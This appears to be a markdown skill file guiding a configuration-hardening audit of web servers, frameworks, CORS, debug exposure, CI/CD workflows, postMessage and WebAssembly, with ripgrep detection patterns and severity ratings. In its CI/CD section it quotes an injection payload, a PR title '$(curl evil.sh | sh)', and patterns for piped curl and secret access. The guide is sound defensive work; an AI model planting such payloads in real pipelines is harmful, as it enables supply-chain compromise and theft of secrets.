---
name: config-hardening
description: Audits configuration security in any project — HTTP security headers, CORS policy, cookie flags, TLS settings, debug modes in production configs, default credentials, exposed admin/debug endpoints, CI/CD pipeline risks (GitHub Actions, GitLab CI), and exposed sensitive files. Use when auditing web server, framework, reverse proxy, or CI configuration files.
license: MIT
---

# Configuration Hardening

## 1 — Find the config surface

```bash
rg --files -g '*.conf' -g '*.cfg' -g '*.ini' -g '*.toml' -g '*.yaml' -g '*.yml' \
   -g 'nginx*' -g 'apache*' -g 'httpd*' -g '.env*' -g 'docker-compose*' \
   -g '.github/workflows/*' -g '.gitlab-ci.yml' -g 'Jenkinsfile' -g 'settings*.py' -g 'config*.js' -g 'appsettings*.json'
```

## 2 — HTTP & transport

- **Headers** on the main response path (app middleware, nginx `add_header`, helmet config):
  - `Strict-Transport-Security` missing → MEDIUM (HIGH for login sessions; recommend `max-age=31536000; includeSubDomains`)
  - `X-Content-Type-Options: nosniff`, `X-Frame-Options`/`frame-ancestors` (clickjacking), `Content-Security-Policy` missing → MEDIUM each; CSP absent on an app with rich user input → HIGH
  - **Weak CSP is not a CSP**: a policy containing `script-src 'unsafe-inline'`/`'unsafe-eval'` (or `default-src *`, `http:` schemes) neutralizes most XSS protection → report as MEDIUM/HIGH with the exact directive to fix (nonces/hashes instead of unsafe-inline; remove unsafe-eval unless the app compiles code)
```bash
rg -n -i "content-security-policy|script-src|default-src" -g '*.conf' -g '*.yml' -g '*.js' -g '*.html' -g '*.py' | head -10
```
  - **Cookie prefixes** absent on auth/session cookies (`__Host-`/`__Secure-` prefixed names pin Secure + no subdomain shadowing) → MEDIUM: `__Host-session` not `session`
  - **SRI**: third-party `<script src="https://...">` without `integrity=` → MEDIUM (script supply-chain injection); same-origin scripts exempt
```bash
rg -n "script[^>]+src=["']https?://" -g '*.html' -g '*.ejs' -g '*.php' | rg -v integrity   # census: every SRI-less script dispositioned
```
  - `Referrer-Policy`, `Permissions-Policy` → LOW
- **TLS**: `ssl_protocols` still includes TLSv1/TLSv1.1 → HIGH; self-signed or expired certs referenced → HIGH; HTTP→HTTPS redirect missing → MEDIUM
- **Cookies**: flags `HttpOnly`, `Secure`, `SameSite` on auth/session cookies (details in `../auth-review/SKILL.md`)

## 3 — CORS

```bash
rg -n -i "access-control-allow-origin|cors\(|allow_origins|origin.*\*"
```
- `Access-Control-Allow-Origin: *` **combined with** `Allow-Credentials: true` → impossible per spec; if framework silently reflects origin instead → **CRITICAL** (any site reads authenticated data)
- Origin reflection/echo of `Origin` header or regex like `https?://.*\.example.com` (matches `evilexample.com` — missing anchored dot) → HIGH
- **`Origin: null` allowed** (sandboxed iframes/data URIs send it; `Access-Control-Allow-Origin: null` in config or allow-lists matching null) with credentials/JSON → HIGH — null origin is attacker-forgeable via sandboxed iframe
- Wildcard without credentials → LOW/MEDIUM (still enumerates data)

## 4 — Debug & exposure

```bash
rg -n -i "debug\s*=\s*true|debug\s*:\s*true|app\.debug|debug_mode"
rg -n -i "traceback|stack.?trace|display_errors\s*=\s*on|show_exceptions"
```
- Django `DEBUG=True` / Flask `debug=True` / Laravel `APP_DEBUG=true` in prod-looking config → HIGH (stack traces, env leaks, Werkzeug debugger = RCE)
- Verbose error responses leaking SQL, paths, versions → MEDIUM
- **Web cache deception**: authenticated responses without `Cache-Control: private`/`no-store` behind a cache keyed on path extension (`/api/me` vs `/api/me/x.css` served from cache) → session data cached and readable. Check auth'd endpoints' cache headers + cache rules that vary on file extension.
- **Web cache poisoning** (GHSL/Academy class): unkeyed inputs (headers the cache ignores but the app reflects — `X-Forwarded-Host`, `X-Original-URL`, some query params) flowing into cacheable responses → one poisoned entry serves every victim. Repo-detectable subset: response headers/redirect URLs built from request headers WITHOUT keying them (`Vary`) + any cache layer in front (CDN config, `Cache-Control: public` on dynamic responses) → High; full exploitation is runtime-verify.
- **HTTP request smuggling**: mostly proxy/runtime-level, but repo signals exist — front+back frameworks disagreeing on header parsing is undetectable statically; flag adjacent risks: `Content-Length` + `Transfer-Encoding` handling in custom proxies/middleware code, and unvalidated `X-Forwarded-*`/absolute-URI handling in reverse-proxy configs (nginx/apache files in repo) → Medium (runtime-verify note).
- **World-writable file permissions**: `chmod 0o777`/`0o666`, `os.open(..., 0o666)`, `fopen` + umask games on files that later execute or hold secrets (keys, configs, socket dirs) → High in prod context; also `chmod -R 777` in Dockerfiles/scripts
- Default creds in configs (`admin/admin`, `postgres/postgres` in docker-compose) → HIGH in prod context, LOW in clearly-local compose
- Exposed sensitive files: `.git/` served, `.env` in webroot, `*.bak`, `.DS_Store`, `dump.sql`, `phpinfo()` pages → HIGH
- Admin/health/debug endpoints (`/actuator/*` with env/heapdump, `/debug`, `/admin`) without auth → CRITICAL (Spring env/heapdump leaks credentials)

## 5 — CI/CD pipelines (supply chain)

```bash
rg -n "pull_request_target|secrets\.|curl.*\|\s*(ba)?sh|sudo|GITHUB_TOKEN|persist-credentials" .github/workflows/ 2>/dev/null
rg -n "\$\{\{\s*github\.event\.(pull_request\.(title|body|head\.ref)|comment\.|issue\.|review\.)" .github/workflows/ 2>/dev/null
```
- `pull_request_target` + checkout of PR head + secrets usage → **CRITICAL** (fork PRs run with base repo secrets)
- **Workflow script injection**: `${{ github.event.pull_request.title }}` (or body/comment/review text) interpolated directly inside a `run:` block → attacker pushes a PR titled `$(curl evil.sh | sh)` → **Critical**. Pass event data through `env:` first (`TITLE: ${{ github.event.pull_request.title }}` then `"$TITLE"` — shell-quoted).
- `curl ... | bash` in workflows/Dockerfiles → HIGH
- Secrets echoed in logs (`echo $SECRET`), or secrets in `env:` at job level where third-party actions run → MEDIUM/HIGH
- Third-party actions pinned by tag (`uses: x/y@v1`) instead of commit SHA → MEDIUM
- Overbroad permissions: `permissions: write-all` or default token with pull requests from forks → MEDIUM

## 6 — Framework-specific spot checks

- Express: `helmet` absent, `trust proxy` weirdness, `x-powered-by` header
- Next.js/Nuxt: `dangerouslyAllowSVG` image configs, middleware auth bypass patterns
- Django: `ALLOWED_HOSTS: ['*']` → MEDIUM; `CSRF_COOKIE_SECURE`, `SESSION_COOKIE_SECURE` false → MEDIUM
- Rails: `force_ssl` off, `config.hosts` empty
- Spring: `management.endpoints.web.exposure.include: "*"` → HIGH

## 7 — Client-side: postMessage & friends

```bash
rg -n "addEventListener\(\s*['\"]message|onmessage\s*=|\.receive\(|window\.postMessage|\.postMessage\(" -g '*.js' -g '*.ts' -g '*.html' -g '*.vue' -g '*.svelte'
```

SPA/extension/embed code that listens for messages:
- **No `event.origin` check** before using `event.data` → HIGH (any window/embed can message it)
- `event.data` flowing into DOM sinks (`innerHTML`, `location.href = e.data`) → **CRITICAL** combo (cross-origin XSS)
- Sending with `postMessage(payload, '*')` when payload is sensitive → MEDIUM (any parent/iframe receives it)
- Safe form: `if (e.origin !== 'https://app.example.com') return;` + escaped sinks + explicit target origin

Also: `window.open` handles with `opener` access across origins, and service-worker `message` handlers — same rules.

## 8 — WebAssembly (WSTG 4.13)

```bash
rg --files -g '*.wasm' -g '*.wat'
rg -n "WebAssembly\.(instantiate|instantiateStreaming|compile|Module)\(" -g '*.js' -g '*.ts' -g '*.html'
rg -n "fetch\(" -g '*.js' -g '*.ts' | rg -i "engine|wasm|url|param" | head -20
```

- wasm module fetched from a **client-controlled URL** (query param → `fetch(url)` → `WebAssembly.instantiateStreaming`) → HIGH — attacker-chosen code executes in the page origin; supply-chain rules apply to the artifact (`../dependency-vulns/SKILL.md`)
- bytes from untrusted input compiled directly (`new WebAssembly.Module(userBytes)`) → HIGH
- `.wasm`/`.wat` blobs tracked in repo: check provenance — what compiled them, is the build tracked/reproducible in CI; unexplained third-party blobs → supply-chain finding, severity by reachability
- Safe shape: fixed-path same-origin fetch (triage discriminator for the instantiate grep — it hits both forms)
- Wasm sandbox escapes / memory bugs in compiled sources (Rust `unsafe`, C pointers) → runtime-verify + source review via the C pack in `../injection-flaws/SKILL.md`

## API resource & consumption (OWASP API4/API10)

**Outbound (API10 — unsafe consumption):** the app calling a third-party API is a client handling untrusted input:
```bash
rg -n "(axios|fetch|requests|http\.get|RestTemplate|WebClient)\(" -g '*.js' -g '*.ts' -g '*.py' -g '*.java' | rg -v timeout | head
```
- Upstream responses rendered/executed without validation (`innerHTML = upstream.data`, `eval(body)`, template injection) → HIGH (compromised/malicious API = XSS/RCE in your app)
- Upstream fields trusted for authorization (`if (upstream.role === 'admin')`) → HIGH — the third party (or DNS/MITM on plain http) becomes your authz
- **No timeout** on outbound calls → HIGH availability note (API4: one slow dependency stalls workers); recommend connect+read timeouts
- **Inbound (API4 — resource consumption):** list endpoints without page/limit caps (unbounded `Model.all()`, `find()` no limit) → MEDIUM; batch/mutation endpoints without max-batch-size → MEDIUM; file-processing endpoints without count caps → note with upload checks

## Reporting

Table of config → issue → severity → exact config change. Config findings are usually cheap fixes; order the fix list by severity then by effort (these often come first after secrets).
